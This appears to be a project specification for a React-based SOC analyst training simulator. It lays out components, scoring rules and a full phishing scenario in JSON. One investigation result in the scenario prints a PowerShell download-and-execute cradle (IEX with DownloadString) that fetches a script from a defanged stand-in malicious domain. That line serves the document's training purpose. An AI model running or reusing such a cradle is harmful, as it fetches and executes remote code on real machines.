# SOC Alert Triage Simulator - Project Specification

## Project Overview

**Goal**: Build an educational web application that simulates SOC analyst alert triage and investigation workflows. Users practice identifying real threats vs false positives through realistic alert scenarios.

**Target outcome**: Portfolio-quality project demonstrating understanding of SOC analyst workflows, investigation methodology, and security decision-making.

## Technical Stack

- **Frontend**: React (functional components with hooks)
- **Styling**: Tailwind CSS
- **State Management**: React Context or simple useState (no external library needed for MVP)
- **Data**: Static JSON files for scenarios (no backend/database)
- **Build**: Vite for dev server and build tooling

## Architecture

### Component Structure
```
src/
├── components/
│   ├── AlertDisplay.jsx        # Shows initial alert details
│   ├── InvestigationPanel.jsx  # List of available investigation actions
│   ├── ActionResult.jsx        # Displays results of investigation actions
│   ├── DecisionPanel.jsx       # List of decision options
│   ├── ScoreCard.jsx           # Shows final score and feedback
│   └── ScenarioSelector.jsx    # Choose which scenario to play
├── data/
│   └── scenarios/
│       ├── scenario_001.json   # PowerShell phishing attempt
│       ├── scenario_002.json   # (Future: suspicious logon)
│       └── scenario_003.json   # (Future: data exfiltration)
├── hooks/
│   └── useScenario.js          # Manages scenario state
├── utils/
│   └── scoring.js              # Scoring calculation logic
└── App.jsx
```

### Data Model

**Scenario JSON Structure**:
```json
{
  "id": "scenario_001",
  "title": "Suspicious PowerShell Execution",
  "alert": {
    "title": "Encoded PowerShell Command Execution",
    "severity": "Medium",
    "timestamp": "2026-02-07 14:23:15 UTC",
    "fields": {
      "Host": "DESKTOP-7K9M2WL",
      "User": "jsmith",
      "Process": "powershell.exe -encodedcommand [base64]",
      "Parent Process": "outlook.exe",
      "Detection Rule": "Encoded PowerShell from Office Application"
    }
  },
  "investigation_actions": [
    {
      "id": "decode_powershell",
      "label": "Decode the PowerShell command",
      "result": {
        "type": "code",
        "content": "IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain[.]com/payload.ps1')"
      },
      "weight": "essential"
    },
    {
      "id": "check_edr",
      "label": "Check endpoint protection logs",
      "result": {
        "type": "text",
        "content": "EDR blocked outbound connection to malicious-domain[.]com at 14:23:16. Domain flagged as known malicious. Process terminated automatically."
      },
      "weight": "essential"
    },
    {
      "id": "check_process_tree",
      "label": "Check process tree/child processes",
      "result": {
        "type": "text",
        "content": "PowerShell spawned by outlook.exe at 14:23:15, terminated after 0.8 seconds. No child processes created."
      },
      "weight": "good_practice"
    },
    {
      "id": "check_network",
      "label": "Query network connections from host",
      "result": {
        "type": "text",
        "content": "Attempted connection to malicious-domain[.]com:443 blocked by firewall at 14:23:16. No successful outbound connections established."
      },
      "weight": "good_practice"
    },
    {
      "id": "check_email",
      "label": "Review user's recent email activity",
      "result": {
        "type": "text",
        "content": "Email received at 14:22:47 from 'IT Support <noreply@legitimate-looking-domain[.]com>' with subject 'Urgent: Password Reset Required'. Email contains suspicious link that matches click timestamp."
      },
      "weight": "essential"
    },
    {
      "id": "check_campaign",
      "label": "Check if other users received similar emails",
      "result": {
        "type": "text",
        "content": "12 other users in organization received identical emails in past 2 hours. 2 others clicked the link and generated similar alerts."
      },
      "weight": "good_practice"
    },
    {
      "id": "check_domain_reputation",
      "label": "Look up domain reputation",
      "result": {
        "type": "text",
        "content": "Domain malicious-domain[.]com registered 3 days ago. Flagged by VirusTotal (8/89 vendors), associated with credential harvesting campaigns per threat intel feeds."
      },
      "weight": "good_practice"
    },
    {
      "id": "check_user_account",
      "label": "Check user's account for suspicious activity",
      "result": {
        "type": "text",
        "content": "No unusual logon attempts. No privilege escalation. No lateral movement indicators. Last successful logon was 08:45 this morning from expected location."
      },
      "weight": "neutral"
    }
  ],
  "decisions": [
    {
      "id": "escalate_full",
      "label": "Escalate to IR team - active phishing campaign affecting multiple users",
      "outcome": "correct",
      "base_points": 100,
      "feedback": "Correct! You identified this as part of a broader phishing campaign requiring immediate response. The malicious payload was blocked, but other users were targeted and the campaign needs to be contained."
    },
    {
      "id": "escalate_partial",
      "label": "Escalate to IR team - single user compromise attempt",
      "outcome": "partial",
      "base_points": 70,
      "feedback": "Partially correct. You correctly identified this as a real threat requiring escalation, but missed that this is an active campaign affecting multiple users (check the email campaign investigation)."
    },
    {
      "id": "create_rule",
      "label": "Create detection rule for similar activity and close",
      "outcome": "incorrect",
      "base_points": 40,
      "feedback": "Incorrect. While creating a detection rule is valuable, you missed that this is an active campaign affecting multiple users right now. This requires immediate escalation to handle the broader incident."
    },
    {
      "id": "close_blocked",
      "label": "Close - threat was blocked by security controls",
      "outcome": "incorrect",
      "base_points": 30,
      "feedback": "Incorrect. While it's true the payload was blocked, this represents an active phishing campaign targeting your organization. The incident response team needs to investigate the full scope and take containment actions."
    },
    {
      "id": "close_false_positive",
      "label": "Close as false positive",
      "outcome": "incorrect",
      "base_points": 0,
      "feedback": "Incorrect. This was a genuine phishing attempt with malicious payload delivery. The encoded PowerShell and malicious domain confirm this was a real attack, not a false positive."
    }
  ],
  "optimal_investigation_count": 4,
  "max_investigation_count": 8
}
```

### Scoring Algorithm

**Inputs**:
- Actions taken (list of action IDs)
- Decision made (decision ID)
- Total actions available

**Calculation**:
1. Start with base points from decision outcome (0-100)
2. Calculate investigation efficiency modifier:
   - Count essential actions taken
   - Count good_practice actions taken  
   - Count total actions taken
   - If took 2+ essential actions AND decision was correct: no penalty
   - If took all actions: -15 points penalty ("over-investigating")
   - If took optimal count (4 in this scenario): +5 points bonus
3. Final score = base_points + modifier (capped at 0-100)

**Feedback components**:
- Decision feedback (from decision object)
- Investigation efficiency feedback:
  - "Excellent investigation - you identified the key evidence efficiently"
  - "Good investigation, though you could have reached this conclusion with fewer steps"
  - "You over-investigated - experienced analysts would have recognized the pattern earlier"
  - "Insufficient investigation - you missed critical evidence"

## User Flow

1. User lands on app, sees scenario selector (for MVP: just one scenario available)
2. Click "Start Scenario" → displays alert in AlertDisplay component
3. InvestigationPanel shows all 8 available actions as buttons/cards
4. User clicks action → ActionResult component shows that result (stays visible)
5. User can click more actions, results accumulate on screen
6. DecisionPanel shows 5 decision options (visible from start, maybe with subtle hint to "investigate before deciding")
7. User selects decision → triggers scoring calculation
8. ScoreCard displays:
   - Final score (0-100)
   - Decision feedback
   - Investigation efficiency feedback
   - Option to try again or view optimal investigation path

## MVP Scope

**Must have**:
- Single scenario (PowerShell phishing) fully implemented
- All 8 investigation actions with results
- All 5 decision options with scoring
- Score calculation and feedback display
- Clean, professional UI using Tailwind

**Nice to have** (but skip for MVP):
- Multiple scenarios
- Progress saving
- Investigation path visualization
- Time tracking
- Leaderboard

**Explicitly out of scope**:
- Backend/database
- User authentication
- Multiplayer/collaborative features
- Real SIEM integration
- Dynamic scenario generation

## Success Criteria

**Technical**:
- App runs without errors
- React components are cleanly separated
- State management is clear and maintainable
- Responsive design works on desktop and tablet
- Code is readable and follows React best practices

**Functional**:
- User can complete full investigation workflow
- All actions display correct results
- Scoring logic matches specification
- Feedback is helpful and accurate
- UI is intuitive without requiring instructions

**Portfolio value**:
- Demonstrates understanding of SOC workflows
- Shows React competency
- Clean, professional appearance
- Easy to demo (no setup required)
- Code is portfolio-ready (clear, documented)

## Complete Reference Scenario

See the JSON structure above for `scenario_001` - this is the complete PowerShell phishing scenario we designed, ready to be implemented as the first (and for MVP, only) scenario.

## Development Notes

- Use Vite for fast dev experience
- Component composition over complexity
- Keep state logic simple - don't over-engineer
- Tailwind for styling - aim for clean, professional security tool aesthetic
- Focus on making one scenario excellent rather than multiple mediocre ones

## Commands

```bash
# Setup
npm create vite@latest soc-triage-sim -- --template react
cd soc-triage-sim
npm install
npm install -D tailwindcss postcss autoprefixer
npx tailwindcss init -p

# Development
npm run dev

# Build
npm run build
```

